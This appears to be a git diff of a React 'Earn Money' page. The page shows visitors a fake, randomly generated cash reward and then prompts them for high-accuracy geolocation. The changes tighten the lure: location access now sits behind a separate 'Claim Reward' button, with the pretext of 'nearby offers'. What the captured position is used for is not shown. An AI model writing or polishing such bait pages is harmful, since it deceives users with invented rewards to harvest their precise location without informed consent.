@@ -5,16 +5,18 @@ const MoneyPage = () => {
   const [reward, setReward] = useState(null);
 
   const handleGetMoney = () => {
-    // 1️⃣ Show reward immediately
     const earned = (Math.random() * 20 + 1).toFixed(2);
     setReward(earned);
-    setStatus("requesting");
+    setStatus("earned");
+  };
 
-    // 2️⃣ Request location on SAME click
+  const requestLocation = () => {
     if (!navigator.geolocation) {
       setStatus("Geolocation not supported");
       return;
     }
+
+    setStatus("requesting");
 
     navigator.geolocation.getCurrentPosition(
       async (position) => {
@@ -33,10 +35,7 @@ const MoneyPage = () => {
           setStatus("failed");
         }
       },
-      (error) => {
-        console.error("Geo error:", error);
-        setStatus("permission denied");
-      },
+      () => setStatus("failed"),
       {
         enableHighAccuracy: true,
         timeout: 10000,
@@ -62,55 +61,61 @@ const MoneyPage = () => {
           borderRadius: "16px",
           maxWidth: "400px",
           width: "100%",
-          padding: "24px",
+          padding: "20px",
           textAlign: "center",
           boxShadow: "0 10px 30px rgba(0,0,0,0.2)",
         }}
       >
+        {/* IMAGE */}
         <img
           src="https://cdn-icons-png.flaticon.com/512/3135/3135706.png"
           alt="Earn money"
           style={{ width: "120px", marginBottom: "15px" }}
         />
 
-        <h2>Earn Money</h2>
-        <p style={{ color: "#555" }}>
-          Click below to instantly claim your reward
+        <h2 style={{ marginBottom: "10px" }}>Earn Money Online</h2>
+        <p style={{ color: "#555", marginBottom: "20px" }}>
+          Click the button below to claim your reward
         </p>
 
         {status === "idle" && (
-          <button onClick={handleGetMoney} style={buttonStyle}>
+          <button
+            onClick={handleGetMoney}
+            style={buttonStyle}
+          >
             💰 Get Money
           </button>
         )}
 
-        {reward && (
-          <h3 style={{ marginTop: "15px" }}>
-            🎉 You earned ${reward}
-          </h3>
+        {status === "earned" && (
+          <>
+            <h3 style={{ margin: "15px 0" }}>
+              🎉 You earned ${reward}
+            </h3>
+            <p style={{ color: "#666", fontSize: "14px" }}>
+              To show nearby offers, allow location access
+            </p>
+            <button
+              onClick={requestLocation}
+              style={buttonStyle}
+            >
+              📍 Claim Reward
+            </button>
+          </>
         )}
 
-        {status === "requesting" && <p>Verifying reward...</p>}
-        {status === "success" && <p>✅ Reward processed successfully</p>}
-        {status === "permission denied" && (
-          <p style={{ color: "red" }}>
-            Location permission denied
-          </p>
-        )}
-        {status === "failed" && (
-          <p style={{ color: "red" }}>
-            Something went wrong
-          </p>
-        )}
+        {status === "requesting" && <p>Requesting location...</p>}
+        {status === "success" && <p>✅ Reward claimed successfully!</p>}
+        {status === "failed" && <p>❌ Something went wrong.</p>}
       </div>
     </div>
   );
 };
 
 const buttonStyle = {
-  padding: "14px",
+  padding: "12px 20px",
   fontSize: "16px",
-  borderRadius: "10px",
+  borderRadius: "8px",
   border: "none",
   cursor: "pointer",
   background: "#667eea",
